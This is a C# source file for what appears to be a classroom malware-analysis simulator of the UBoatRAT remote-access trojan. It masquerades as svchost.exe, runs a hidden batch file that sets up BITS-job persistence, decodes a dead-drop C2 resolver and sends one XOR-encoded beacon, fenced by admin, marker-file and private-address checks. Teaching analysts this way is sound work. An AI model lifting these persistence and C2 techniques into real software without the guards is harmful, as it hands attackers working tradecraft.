using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

namespace UBoatRATLab
{
    internal static class Program
    {
        /*
         * BENIGN EDUCATIONAL SIMULATOR
         *
         * This program does not implement a RAT, remote command execution,
         * credential access, file exfiltration, interactive control, or a
         * persistent command channel.
         *
         * It reproduces a restricted set of observable UBoatRAT-style
         * artefacts inside the laboratory directory only:
         *
         *   1. Creates a runtime\svchost.exe copy.
         *   2. Creates runtime\init.bat.
         *   3. Registers a BITS download job with SetNotifyCmdLine.
         *   4. Retrieves a controlled dead-drop resolver.
         *   5. Sends one fixed, one-shot, XOR-encoded benign beacon.
         */

        private const string RuntimeDirectoryName = "runtime";
        private const string LabMarkerName = "UBoatRAT_LAB.marker";
        private const string JobName = "UBoatLab_Persistence";

        private const string ResolverHost = "uboat-c2.test";

        private const string TriggerUrl =
            "http://uboat-c2.test:8080/c2/trigger.dat";

        private const string ResolverUrl =
            "http://uboat-c2.test:8080/resolver/README.md";

        private const int BeaconPort = 9001;
        private const byte XorKey = 0x88;

        private const string BeaconText =
            "488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL";

        /*
         * When the original executable runs, ExecutableDirectory is:
         *
         * C:\Users\Administrator\Desktop\Labs\UBoatRAT
         *
         * When BITS launches the copied executable, ExecutableDirectory is:
         *
         * C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime
         *
         * DetermineLabDirectory handles both situations.
         */

        private static readonly string ExecutableDirectory =
            GetExecutableDirectory();

        private static readonly string LabDirectory =
            DetermineLabDirectory(ExecutableDirectory);

        private static readonly string RuntimeDirectory =
            Path.Combine(LabDirectory, RuntimeDirectoryName);

        private static readonly string SourceMarker =
            Path.Combine(LabDirectory, LabMarkerName);

        private static readonly string InstalledCopy =
            Path.Combine(RuntimeDirectory, "svchost.exe");

        private static readonly string InstalledMarker =
            Path.Combine(RuntimeDirectory, LabMarkerName);

        private static readonly string InitBatch =
            Path.Combine(RuntimeDirectory, "init.bat");

        private static readonly string BitsAdminLog =
            Path.Combine(RuntimeDirectory, "bitsadmin.log");

        private static readonly string CallbackLog =
            Path.Combine(RuntimeDirectory, "callback.log");

        private static readonly string ExecutionLog =
            Path.Combine(RuntimeDirectory, "execution.log");

        private static readonly string ResolverEvidence =
            Path.Combine(RuntimeDirectory, "resolver_response.txt");

        private static readonly string BeaconMarker =
            Path.Combine(RuntimeDirectory, "beacon.sent");

        private static readonly string TriggerDestination =
            Path.Combine(RuntimeDirectory, "uboat_lab_trigger.dat");

        private static readonly string BlockedLog =
            Path.Combine(LabDirectory, "UBoatRAT_Lab_Blocked.log");

        [STAThread]
        private static void Main(string[] args)
        {
            try
            {
                if (args != null &&
                    args.Length == 1 &&
                    string.Equals(
                        args[0],
                        "--bits-callback",
                        StringComparison.OrdinalIgnoreCase))
                {
                    RunBitsCallback();
                    return;
                }

                RunInitialStage();
            }
            catch (Exception exception)
            {
                WriteEmergencyLog(exception);
            }
        }

        private static void RunInitialStage()
        {
            /*
             * The initial stage is expected to be launched from the
             * Administrator PowerShell prepared by lab_start.ps1.
             */

            if (!IsAdministrator())
            {
                WriteBlockedLog(
                    "Execution blocked: run WinSvcHelper.exe from an " +
                    "Administrator PowerShell inside the lab directory.");

                return;
            }

            /*
             * Refuse execution unless the explicit benign-lab marker exists
             * next to the original executable.
             */

            if (!File.Exists(SourceMarker))
            {
                WriteBlockedLog(
                    "Execution blocked: " + LabMarkerName +
                    " was not found next to WinSvcHelper.exe.");

                return;
            }

            /*
             * No activity starts unless the fixed lab hostname resolves to
             * an RFC1918 private IPv4 address.
             */

            IPAddress[] resolverAddresses =
                ResolvePrivateIpv4Addresses(ResolverHost);

            if (resolverAddresses.Length == 0)
            {
                WriteBlockedLog(
                    "Execution blocked: " + ResolverHost +
                    " did not resolve to an RFC1918 private IPv4 address.");

                return;
            }

            Directory.CreateDirectory(RuntimeDirectory);

            WriteLog(
                ExecutionLog,
                "Initial laboratory stage started.");

            WriteLog(
                ExecutionLog,
                "Laboratory directory: " + LabDirectory);

            WriteLog(
                ExecutionLog,
                "Runtime directory: " + RuntimeDirectory);

            WriteLog(
                ExecutionLog,
                "Resolver validated as private address: " +
                resolverAddresses[0]);

            string currentExecutable =
                Process.GetCurrentProcess().MainModule.FileName;

            /*
             * If someone manually launches runtime\svchost.exe without the
             * callback argument, do nothing. This prevents recursive setup.
             */

            if (PathsEqual(currentExecutable, InstalledCopy) ||
                IsRunningFromRuntimeDirectory())
            {
                WriteLog(
                    ExecutionLog,
                    "The runtime copy was launched without " +
                    "--bits-callback. No action was performed.");

                return;
            }

            /*
             * Copy only into the runtime subdirectory of the lab.
             */

            File.Copy(
                currentExecutable,
                InstalledCopy,
                true);

            File.Copy(
                SourceMarker,
                InstalledMarker,
                true);

            WriteLog(
                ExecutionLog,
                "Simulator copied to: " + InstalledCopy);

            CreateInitBatch();
            LaunchInitBatch();

            WriteLog(
                ExecutionLog,
                "BITS bootstrap completed through init.bat.");

            WriteLog(
                ExecutionLog,
                "Initial stage finished.");
        }

        private static void CreateInitBatch()
        {
            /*
             * The batch file is intentionally preserved so students can
             * inspect it during the behavioral-analysis portion.
             *
             * The BITS job downloads only an inert trigger file.
             * SetNotifyCmdLine launches the fixed copied simulator with the
             * fixed --bits-callback argument.
             */
            string callbackParameters =
                "\\\"" +
                InstalledCopy +
                "\\\" --bits-callback";
            string[] batchLines =
            {
                "@echo off",
                "setlocal",
                "rem ======================================================",
                "rem BENIGN UBoatRAT laboratory simulation",
                "rem No malware or remote command channel is implemented.",
                "rem This file is intentionally preserved for analysis.",
                "rem ======================================================",
                "",
                "bitsadmin /cancel \"" + JobName +
                    "\" >nul 2>&1",
                "",
                "del /f /q \"" + TriggerDestination +
                    "\" >nul 2>&1",
                "",
                "del /f /q \"" + BitsAdminLog +
                    "\" >nul 2>&1",
                "",
                "bitsadmin /create /download \"" +
                    JobName + "\" > \"" +
                    BitsAdminLog + "\" 2>&1",
                "",
                "if errorlevel 1 exit /b 10",
                "",
                "bitsadmin /addfile \"" +
                    JobName + "\" \"" +
                    TriggerUrl + "\" \"" +
                    TriggerDestination + "\" >> \"" +
                    BitsAdminLog + "\" 2>&1",
                "",
                "if errorlevel 1 exit /b 11",
                "",
               "bitsadmin /setnotifycmdline \"" +
                    JobName + "\" \"" +
                    InstalledCopy + "\" \"" +
                    callbackParameters + "\" >> \"" +
                    BitsAdminLog + "\" 2>&1",
                "",
                "if errorlevel 1 exit /b 12",
                "",
                "bitsadmin /resume \"" +
                    JobName + "\" >> \"" +
                    BitsAdminLog + "\" 2>&1",
                "",
                "if errorlevel 1 exit /b 13",
                "",
                "exit /b 0"
            };

            File.WriteAllLines(
                InitBatch,
                batchLines,
                Encoding.ASCII);

            WriteLog(
                ExecutionLog,
                "Created BITS bootstrap script: " +
                InitBatch);
        }

        private static void LaunchInitBatch()
        {
            ProcessStartInfo startInfo =
                new ProcessStartInfo();

            startInfo.FileName = "cmd.exe";

            /*
             * The double quotes around the batch path are required because
             * the laboratory directory may contain spaces.
             */

            startInfo.Arguments =
                "/d /c \"\"" +
                InitBatch +
                "\"\"";

            startInfo.WorkingDirectory =
                RuntimeDirectory;

            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            startInfo.WindowStyle =
                ProcessWindowStyle.Hidden;

            using (Process process =
                Process.Start(startInfo))
            {
                if (process == null)
                {
                    throw new InvalidOperationException(
                        "cmd.exe could not be started.");
                }

                if (!process.WaitForExit(20000))
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                        // Best-effort termination only.
                    }

                    throw new TimeoutException(
                        "init.bat did not finish within 20 seconds.");
                }

                if (process.ExitCode != 0)
                {
                    throw new InvalidOperationException(
                        "init.bat failed with exit code " +
                        process.ExitCode +
                        ". Check runtime\\bitsadmin.log.");
                }
            }
        }

        private static void RunBitsCallback()
        {
            Directory.CreateDirectory(RuntimeDirectory);

            WriteLog(
                CallbackLog,
                "BITS callback process started.");

            /*
             * The callback is accepted only when it is the installed
             * runtime copy launched from the expected path.
             */

            if (!IsRunningFromRuntimeDirectory() ||
                !PathsEqual(
                    Process.GetCurrentProcess().MainModule.FileName,
                    InstalledCopy))
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: process is not the installed " +
                    "runtime copy.");

                return;
            }

            if (!File.Exists(InstalledMarker))
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: installed lab marker is missing.");

                return;
            }

            /*
             * CreateNew acts as a one-shot lock. Concurrent callbacks cannot
             * send multiple beacons.
             */

            if (!TryAcquireBeaconGuard())
            {
                WriteLog(
                    CallbackLog,
                    "One-shot beacon already sent or currently in " +
                    "progress. No network activity was performed.");

                return;
            }

            bool beaconSent = false;

            try
            {
                IPAddress[] resolverAddresses =
                    ResolvePrivateIpv4Addresses(ResolverHost);

                if (resolverAddresses.Length == 0)
                {
                    WriteLog(
                        CallbackLog,
                        "Callback blocked: resolver does not point to a " +
                        "private IPv4 address.");

                    return;
                }

                string resolverContent =
                    DownloadResolver();

                File.WriteAllText(
                    ResolverEvidence,
                    resolverContent,
                    Encoding.UTF8);

                IPAddress targetAddress;
                int targetPort;

                if (!TryParseResolver(
                        resolverContent,
                        out targetAddress,
                        out targetPort))
                {
                    WriteLog(
                        CallbackLog,
                        "Resolver parsing failed. No beacon was sent.");

                    return;
                }

                /*
                 * The resolver cannot redirect the simulator elsewhere.
                 * The decoded IP must equal one of the private addresses
                 * resolved for uboat-c2.test.
                 */

                if (!ContainsAddress(
                        resolverAddresses,
                        targetAddress))
                {
                    WriteLog(
                        CallbackLog,
                        "Callback blocked: decoded target does not " +
                        "match the resolver host.");

                    return;
                }

                if (targetPort != BeaconPort)
                {
                    WriteLog(
                        CallbackLog,
                        "Callback blocked: decoded port is not the " +
                        "fixed laboratory port 9001.");

                    return;
                }

                SendOneShotBeacon(
                    targetAddress,
                    targetPort);

                beaconSent = true;

                File.WriteAllText(
                    BeaconMarker,
                    "A single benign beacon was sent at " +
                    DateTime.UtcNow.ToString("O") +
                    Environment.NewLine,
                    Encoding.ASCII);

                WriteLog(
                    CallbackLog,
                    "One-shot benign beacon sent successfully.");

                WriteLog(
                    CallbackLog,
                    "No response was read and no command channel " +
                    "was opened.");
            }
            finally
            {
                /*
                 * If the network operation failed, remove the pending
                 * marker so a later controlled test can retry.
                 */

                if (!beaconSent)
                {
                    try
                    {
                        File.Delete(BeaconMarker);
                    }
                    catch
                    {
                        // Best-effort cleanup only.
                    }
                }
            }
        }

        private static string DownloadResolver()
        {
            WriteLog(
                CallbackLog,
                "Requesting controlled resolver: " +
                ResolverUrl);

            using (TimeoutWebClient client =
                new TimeoutWebClient(5000))
            {
                /*
                 * The private lab route is accessed directly instead of
                 * being sent through a workstation or corporate proxy.
                 */

                client.Proxy = null;

                client.Headers[
                    HttpRequestHeader.UserAgent] =
                    "UBoatRAT-Lab-Simulator/1.0";

                return client.DownloadString(
                    ResolverUrl);
            }
        }

        private static bool TryParseResolver(
            string resolverContent,
            out IPAddress targetAddress,
            out int targetPort)
        {
            targetAddress = null;
            targetPort = 0;

            if (string.IsNullOrWhiteSpace(
                    resolverContent))
            {
                return false;
            }

            /*
             * Expected resolver format:
             *
             * [Rudeltaktik]<BASE64_PRIVATE_IP_AND_PORT>!
             *
             * Example decoded value:
             *
             * 10.10.20.15:9001
             */

            Match match = Regex.Match(
                resolverContent,
                @"\[Rudeltaktik\](?<value>[A-Za-z0-9+/=]+)!",
                RegexOptions.CultureInvariant);

            if (!match.Success)
            {
                return false;
            }

            string decodedValue;

            try
            {
                byte[] decodedBytes =
                    Convert.FromBase64String(
                        match.Groups["value"].Value);

                decodedValue =
                    Encoding.ASCII.GetString(
                        decodedBytes);
            }
            catch
            {
                return false;
            }

            int separatorIndex =
                decodedValue.LastIndexOf(':');

            if (separatorIndex <= 0 ||
                separatorIndex >=
                    decodedValue.Length - 1)
            {
                return false;
            }

            string addressText =
                decodedValue.Substring(
                    0,
                    separatorIndex);

            string portText =
                decodedValue.Substring(
                    separatorIndex + 1);

            IPAddress parsedAddress;
            int parsedPort;

            if (!IPAddress.TryParse(
                    addressText,
                    out parsedAddress))
            {
                return false;
            }

            if (!int.TryParse(
                    portText,
                    out parsedPort))
            {
                return false;
            }

            if (!IsPrivateIpv4(parsedAddress) ||
                parsedPort != BeaconPort)
            {
                return false;
            }

            targetAddress = parsedAddress;
            targetPort = parsedPort;

            WriteLog(
                CallbackLog,
                "Resolver decoded private endpoint: " +
                targetAddress + ":" +
                targetPort);

            return true;
        }

        private static void SendOneShotBeacon(
            IPAddress address,
            int port)
        {
            /*
             * The payload is fixed at compile time.
             * It contains no hostname, username, files, environment data,
             * credentials, or collected information.
             */

            byte[] plaintext =
                Encoding.ASCII.GetBytes(
                    BeaconText);

            byte[] encoded =
                new byte[plaintext.Length];

            for (int index = 0;
                 index < plaintext.Length;
                 index++)
            {
                encoded[index] =
                    (byte)(
                        plaintext[index] ^
                        XorKey
                    );
            }

            using (TcpClient client =
                new TcpClient(
                    AddressFamily.InterNetwork))
            {
                IAsyncResult connectResult =
                    client.BeginConnect(
                        address,
                        port,
                        null,
                        null);

                bool connected =
                    connectResult.AsyncWaitHandle.WaitOne(
                        TimeSpan.FromSeconds(5));

                if (!connected)
                {
                    client.Close();

                    throw new TimeoutException(
                        "The TCP laboratory listener did not respond.");
                }

                client.EndConnect(
                    connectResult);

                client.SendTimeout = 5000;
                client.ReceiveTimeout = 5000;

                using (NetworkStream stream =
                    client.GetStream())
                {
                    stream.Write(
                        encoded,
                        0,
                        encoded.Length);

                    stream.Flush();

                    /*
                     * Deliberately do not read a response.
                     * This simulator cannot receive commands.
                     */
                }
            }

            WriteLog(
                CallbackLog,
                "Sent " +
                encoded.Length +
                " XOR-encoded bytes to the fixed lab listener.");
        }

        private static bool TryAcquireBeaconGuard()
        {
            try
            {
                using (FileStream stream =
                    new FileStream(
                        BeaconMarker,
                        FileMode.CreateNew,
                        FileAccess.Write,
                        FileShare.None))
                {
                    byte[] content =
                        Encoding.ASCII.GetBytes(
                            "Beacon pending at " +
                            DateTime.UtcNow.ToString("O") +
                            Environment.NewLine);

                    stream.Write(
                        content,
                        0,
                        content.Length);

                    stream.Flush();
                }

                return true;
            }
            catch (IOException)
            {
                return false;
            }
        }

        private static IPAddress[] ResolvePrivateIpv4Addresses(
            string hostname)
        {
            try
            {
                IPAddress[] addresses =
                    Dns.GetHostAddresses(
                        hostname);

                IPAddress[] privateAddresses =
                    new IPAddress[
                        addresses.Length
                    ];

                int count = 0;

                for (int index = 0;
                     index < addresses.Length;
                     index++)
                {
                    if (IsPrivateIpv4(
                            addresses[index]))
                    {
                        privateAddresses[count] =
                            addresses[index];

                        count++;
                    }
                }

                IPAddress[] result =
                    new IPAddress[count];

                Array.Copy(
                    privateAddresses,
                    result,
                    count);

                return result;
            }
            catch
            {
                return new IPAddress[0];
            }
        }

        private static bool ContainsAddress(
            IPAddress[] addresses,
            IPAddress target)
        {
            for (int index = 0;
                 index < addresses.Length;
                 index++)
            {
                if (addresses[index].Equals(
                        target))
                {
                    return true;
                }
            }

            return false;
        }

        private static bool IsPrivateIpv4(
            IPAddress address)
        {
            if (address == null ||
                address.AddressFamily !=
                    AddressFamily.InterNetwork)
            {
                return false;
            }

            byte[] bytes =
                address.GetAddressBytes();

            /*
             * RFC1918 ranges:
             *
             * 10.0.0.0/8
             * 172.16.0.0/12
             * 192.168.0.0/16
             */

            if (bytes[0] == 10)
            {
                return true;
            }

            if (bytes[0] == 172 &&
                bytes[1] >= 16 &&
                bytes[1] <= 31)
            {
                return true;
            }

            if (bytes[0] == 192 &&
                bytes[1] == 168)
            {
                return true;
            }

            return false;
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity =
                WindowsIdentity.GetCurrent();

            WindowsPrincipal principal =
                new WindowsPrincipal(
                    identity);

            return principal.IsInRole(
                WindowsBuiltInRole.Administrator);
        }

        private static string GetExecutableDirectory()
        {
            return AppDomain
                .CurrentDomain
                .BaseDirectory
                .TrimEnd(
                    Path.DirectorySeparatorChar,
                    Path.AltDirectorySeparatorChar);
        }

        private static string DetermineLabDirectory(
            string executableDirectory)
        {
            string directoryName =
                Path.GetFileName(
                    executableDirectory);

            if (string.Equals(
                    directoryName,
                    RuntimeDirectoryName,
                    StringComparison.OrdinalIgnoreCase))
            {
                DirectoryInfo parent =
                    Directory.GetParent(
                        executableDirectory);

                if (parent == null)
                {
                    throw new InvalidOperationException(
                        "Could not determine the laboratory directory.");
                }

                return parent.FullName;
            }

            return executableDirectory;
        }

        private static bool IsRunningFromRuntimeDirectory()
        {
            return PathsEqual(
                ExecutableDirectory,
                RuntimeDirectory);
        }

        private static bool PathsEqual(
            string firstPath,
            string secondPath)
        {
            string normalizedFirst =
                Path.GetFullPath(
                    firstPath)
                .TrimEnd(
                    Path.DirectorySeparatorChar,
                    Path.AltDirectorySeparatorChar);

            string normalizedSecond =
                Path.GetFullPath(
                    secondPath)
                .TrimEnd(
                    Path.DirectorySeparatorChar,
                    Path.AltDirectorySeparatorChar);

            return string.Equals(
                normalizedFirst,
                normalizedSecond,
                StringComparison.OrdinalIgnoreCase);
        }

        private static void WriteLog(
            string logPath,
            string message)
        {
            try
            {
                string directory =
                    Path.GetDirectoryName(
                        logPath);

                if (!string.IsNullOrEmpty(
                        directory))
                {
                    Directory.CreateDirectory(
                        directory);
                }

                string line =
                    "[" +
                    DateTime.UtcNow.ToString("O") +
                    "] " +
                    message +
                    Environment.NewLine;

                File.AppendAllText(
                    logPath,
                    line,
                    Encoding.UTF8);
            }
            catch
            {
                /*
                 * Logging failure must never trigger additional behavior.
                 */
            }
        }

        private static void WriteBlockedLog(
            string message)
        {
            WriteLog(
                BlockedLog,
                message);
        }

        private static void WriteEmergencyLog(
            Exception exception)
        {
            try
            {
                Directory.CreateDirectory(
                    RuntimeDirectory);

                WriteLog(
                    Path.Combine(
                        RuntimeDirectory,
                        "error.log"),
                    exception.ToString());
            }
            catch
            {
                /*
                 * Fail closed and silently.
                 */
            }
        }

        private sealed class TimeoutWebClient :
            WebClient
        {
            private readonly int timeoutMilliseconds;

            public TimeoutWebClient(
                int timeoutMilliseconds)
            {
                this.timeoutMilliseconds =
                    timeoutMilliseconds;
            }

            protected override WebRequest GetWebRequest(
                Uri address)
            {
                WebRequest request =
                    base.GetWebRequest(
                        address);

                if (request != null)
                {
                    request.Timeout =
                        timeoutMilliseconds;

                    HttpWebRequest httpRequest =
                        request as HttpWebRequest;

                    if (httpRequest != null)
                    {
                        httpRequest.ReadWriteTimeout =
                            timeoutMilliseconds;

                        httpRequest.AllowAutoRedirect =
                            false;
                    }
                }

                return request;
            }
        }
    }
}
